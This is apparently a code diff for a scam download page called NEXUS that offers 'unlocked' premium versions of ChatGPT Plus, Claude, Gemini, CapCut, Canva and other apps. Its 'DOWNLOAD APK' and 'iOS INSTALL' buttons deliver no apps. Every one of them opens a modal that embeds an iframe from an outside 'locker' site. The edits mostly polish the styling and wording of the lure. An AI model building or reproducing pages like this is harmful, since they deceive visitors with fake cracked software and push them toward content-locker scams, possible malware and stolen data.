@@ -24,7 +24,6 @@
             letter-spacing: -0.02em;
         }
 
-        /* Cinematic Background */
         .glow-sphere {
             position: fixed;
             width: 80vw;
@@ -35,21 +34,18 @@
             filter: blur(120px);
         }
 
-        /* Professional Nav */
         nav {
             backdrop-filter: blur(30px);
             background: rgba(0, 0, 0, 0.7);
             border-bottom: 1px solid var(--border);
         }
 
-        /* Modern Typography */
         .hero-title {
             background: linear-gradient(to bottom, #ffffff 40%, #52525b 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
-        /* The Premium Card */
         .nexus-card {
             background: var(--surface);
             border: 1px solid var(--border);
@@ -65,15 +61,6 @@
             box-shadow: 0 40px 80px rgba(0,0,0,0.8);
         }
 
-        .nexus-card::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            background: linear-gradient(135deg, transparent 0%, rgba(255,255,255,0.03) 100%);
-            pointer-events: none;
-        }
-
-        /* Overlay Styling */
         #app-overlay {
             position: fixed;
             inset: 0;
@@ -85,25 +72,22 @@
 
         .btn-gradient {
             background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%);
-            transition: transform 0.3s ease, filter 0.3s ease;
         }
 
-        .btn-gradient:hover {
-            filter: brightness(1.2);
-            transform: scale(1.02);
-        }
-
-        /* Icon Polish */
-        .app-icon-wrap {
-            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.1);
+        /* Responsive Iframe for the locker */
+        .locker-container {
+            width: 100%;
+            max-width: 500px;
+            height: 80vh;
+            background: #fff;
+            border-radius: 40px;
+            overflow: hidden;
         }
     </style>
 </head>
 <body class="antialiased">
 
     <div class="glow-sphere" style="top: -20%; left: -10%;"></div>
-    <div class="glow-sphere" style="bottom: -20%; right: -10%; background: radial-gradient(circle, rgba(168, 85, 247, 0.05) 0%, rgba(0,0,0,0) 70%);"></div>
 
     <nav class="fixed top-0 w-full z-[100] px-8 py-5">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
@@ -111,13 +95,8 @@
                 <span class="w-10 h-10 bg-indigo-600 rounded-xl flex items-center justify-center text-white">N</span>
                 NEXUS
             </div>
-            <div class="hidden md:flex gap-10 text-sm font-semibold text-gray-400">
-                <a href="#" class="hover:text-white transition-colors">OS Ver. 4.0</a>
-                <a href="#" class="hover:text-white transition-colors">Security</a>
-                <a href="#" class="hover:text-white transition-colors">Nodes</a>
-            </div>
             <div class="text-xs font-mono text-indigo-400 border border-indigo-500/30 px-3 py-1 rounded-full bg-indigo-500/5">
-                STATUS: ENCRYPTED
+                SECURE ACCESS ENABLED
             </div>
         </div>
     </nav>
@@ -125,12 +104,11 @@
     <main class="pt-48 pb-32 px-8">
         <div class="max-w-7xl mx-auto">
             <header class="max-w-4xl mb-24">
-                <p class="text-indigo-400 font-bold tracking-[0.3em] uppercase text-xs mb-6">Premium Repository</p>
                 <h1 class="text-7xl md:text-9xl font-extrabold hero-title tracking-tighter leading-none mb-10">
                     The Elite <br>Mobile Layer.
                 </h1>
                 <p class="text-2xl text-gray-400 font-light leading-relaxed max-w-2xl">
-                    A curated architecture of world-class AI and Creative suites, unlocked for professional deployment.
+                    High-performance tools, verified and unlocked for the 2026 professional landscape.
                 </p>
             </header>
 
@@ -144,14 +122,14 @@
                 <div class="w-12 h-12 rounded-full border border-white/10 flex items-center justify-center group-hover:bg-white group-hover:text-black transition-all">
                     <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
                 </div>
-                CLOSE REPOSITORY
+                EXIT REPOSITORY
             </button>
             <div id="overlay-content"></div>
         </div>
     </div>
 
-    <div id="locker-modal" class="fixed inset-0 z-[200] bg-black/95 hidden items-center justify-center p-8" onclick="closeLocker()">
-        <div class="w-full max-w-lg h-[85vh] bg-white rounded-[40px] overflow-hidden shadow-2xl" onclick="event.stopPropagation()">
+    <div id="locker-modal" class="fixed inset-0 z-[200] bg-black/95 hidden items-center justify-center p-6" onclick="closeLocker()">
+        <div class="locker-container" onclick="event.stopPropagation()">
             <iframe src="https://appchecker.space/cl/i/6nnlj7" frameborder="0" class="w-full h-full"></iframe>
         </div>
     </div>
@@ -162,15 +140,15 @@
                 name: 'ChatGPT Plus', 
                 logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/chatgpt-icon.png', 
                 tag: 'Intelligence Node',
-                desc: 'Access the world’s leading LLM. This build includes high-priority access to GPT-4o, DALL-E 3 image generation, and native voice reasoning protocols.',
+                desc: 'Access the world’s leading LLM. This build includes high-priority access to GPT-4o and DALL-E 3.',
                 features: ['GPT-4o Access', 'DALL-E 3 Native', 'Data Analysis Pro', 'No Latency'],
                 category: 'AI Engine'
             },
             { 
                 name: 'Claude 3.5', 
-                logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Claude_AI_logo.svg/1024px-Claude_AI_logo.svg.png', 
+                logo: 'https://www.creativall.fr/wp-content/uploads/2024/07/Claude-AI-Logo.png', 
                 tag: 'Deep Reasoning',
-                desc: 'Anthropics most sophisticated model. Specialized in coding, deep research, and high-context writing with human-like nuance.',
+                desc: 'Anthropic’s most sophisticated model. Specialized in coding and high-context research.',
                 features: ['Artifacts UI', '200k Context', 'Code Master', 'Research Logic'],
                 category: 'Research AI'
             },
@@ -178,7 +156,7 @@
                 name: 'Perplexity Pro', 
                 logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/perplexity-ai-icon.png', 
                 tag: 'Real-time Search',
-                desc: 'The end of traditional searching. Perplexity Pro provides instant, cited answers with zero advertising and live web analysis.',
+                desc: 'Direct, cited answers with zero advertising and live web analysis.',
                 features: ['Source Citations', 'Pro Search Mode', 'File Uploads', 'Switchable LLMs'],
                 category: 'Knowledge'
             },
@@ -186,7 +164,7 @@
                 name: 'Gemini Ultra', 
                 logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/google-gemini-icon.png', 
                 tag: 'Google Ecosystem',
-                desc: 'The powerhouse of multi-modal AI. Seamlessly integrated with Google Workspace to manage documents, emails, and data streams.',
+                desc: 'Multi-modal AI seamlessly integrated with Google Workspace.',
                 features: ['Workspace Sync', 'Image Recognition', 'Ultra-fast Logic', 'Travel Extensions'],
                 category: 'AI Suite'
             },
@@ -194,7 +172,7 @@
                 name: 'CapCut Pro', 
                 logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/capcut-icon.png', 
                 tag: 'Video Production',
-                desc: 'Desktop-grade video editing on mobile. Unlock 4K raw exports, all AI templates, and remove watermarks for social dominance.',
+                desc: 'Desktop-grade video editing on mobile with 4K raw exports.',
                 features: ['4K 60FPS Raw', 'All Pro Templates', 'AI Body VFX', 'No Watermark'],
                 category: 'Video Edit'
             },
@@ -202,7 +180,7 @@
                 name: 'Alight Motion', 
                 logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/alight-motion-icon.png', 
                 tag: 'Motion Graphics',
-                desc: 'The definitive motion design tool. Create complex animations, vector graphics, and visual effects with unlimited layers.',
+                desc: 'Create complex animations and vector graphics with unlimited layers.',
                 features: ['Keyframe Animation', 'Vector Graphics', 'Pro Visual Effects', 'Unlimited Layers'],
                 category: 'Animation'
             },
@@ -210,11 +188,17 @@
                 name: 'Canva Pro', 
                 logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/canva-icon.png', 
                 tag: 'Visual Design',
-                desc: 'Empower your visual brand. Nexus version unlocks the complete Magic Studio, premium assets, and enterprise brand kit management.',
+                desc: 'Complete Magic Studio, premium assets, and brand kit management.',
                 features: ['Magic Resizer', 'Background Remover', '100M+ Assets', 'Brand Kits'],
                 category: 'Graphics'
             }
         ];
+
+        function handleImageError(img, name) {
+            // If logo fails, replace with a high-end UI Avatar
+            img.onerror = null;
+            img.src = `https://ui-avatars.com/api/?name=${encodeURIComponent(name)}&background=6366f1&color=fff&size=256&bold=true`;
+        }
 
         function init() {
             const container = document.getElementById('grid-container');
@@ -222,8 +206,8 @@
                 container.innerHTML += `
                     <div class="nexus-card p-10 flex flex-col justify-between cursor-pointer group" onclick="showDetails(${i})">
                         <div>
-                            <div class="w-16 h-16 rounded-2xl mb-8 app-icon-wrap overflow-hidden">
-                                <img src="${app.logo}" class="w-full h-full object-cover">
+                            <div class="w-16 h-16 rounded-2xl mb-8 overflow-hidden bg-white/5 border border-white/10">
+                                <img src="${app.logo}" alt="${app.name}" class="w-full h-full object-cover" onerror="handleImageError(this, '${app.name}')">
                             </div>
                             <p class="text-indigo-500 font-bold text-[10px] tracking-[0.2em] uppercase mb-2">${app.tag}</p>
                             <h3 class="text-2xl font-bold tracking-tight mb-4">${app.name}</h3>
@@ -245,22 +229,22 @@
             document.getElementById('overlay-content').innerHTML = `
                 <div class="grid lg:grid-cols-2 gap-24 items-start">
                     <div>
-                        <img src="${app.logo}" class="w-32 h-32 rounded-[32px] mb-12 shadow-2xl">
+                        <div class="w-32 h-32 rounded-[32px] mb-12 shadow-2xl overflow-hidden bg-white/5 border border-white/10">
+                            <img src="${app.logo}" class="w-full h-full object-cover" onerror="handleImageError(this, '${app.name}')">
+                        </div>
                         <h2 class="text-7xl md:text-8xl font-black tracking-tighter mb-8 leading-none">${app.name}</h2>
                         <p class="text-2xl text-gray-400 font-light leading-relaxed mb-12">${app.desc}</p>
                         <div class="flex flex-col sm:flex-row gap-6">
-                            <button onclick="openLocker()" class="btn-gradient px-12 py-6 rounded-3xl font-black text-xl flex items-center justify-center gap-4">
-                                <img src="https://www.vectorlogo.zone/logos/google_play/google_play-icon.svg" class="w-6 h-6">
+                            <button onclick="openLocker()" class="btn-gradient px-12 py-6 rounded-3xl font-black text-xl flex items-center justify-center gap-4 text-white">
                                 DOWNLOAD APK
                             </button>
                             <button onclick="openLocker()" class="bg-white text-black px-12 py-6 rounded-3xl font-black text-xl flex items-center justify-center gap-4 hover:bg-gray-200 transition-all">
-                                <img src="https://www.vectorlogo.zone/logos/apple/apple-icon.svg" class="w-6 h-6">
                                 iOS INSTALL
                             </button>
                         </div>
                     </div>
                     <div class="bg-[#0e0e11] border border-white/5 p-12 rounded-[40px]">
-                        <h4 class="text-xs font-black tracking-[0.3em] text-gray-500 uppercase mb-10">Nexus Verified Features</h4>
+                        <h4 class="text-xs font-black tracking-[0.3em] text-gray-500 uppercase mb-10">Premium Unlocks</h4>
                         <div class="space-y-8">
                             ${app.features.map(f => `
                                 <div class="flex items-center gap-6">
@@ -276,21 +260,12 @@
             window.scrollTo(0, 0);
         }
 
-        function hideDetails() {
-            document.getElementById('app-overlay').style.display = 'none';
-        }
-
-        function openLocker() {
-            document.getElementById('locker-modal').style.display = 'flex';
-        }
-
-        function closeLocker() {
-            document.getElementById('locker-modal').style.display = 'none';
-        }
+        function hideDetails() { document.getElementById('app-overlay').style.display = 'none'; }
+        function openLocker() { document.getElementById('locker-modal').style.display = 'flex'; }
+        function closeLocker() { document.getElementById('locker-modal').style.display = 'none'; }
 
         init();
     </script>
 </body>
 </html>
-
 
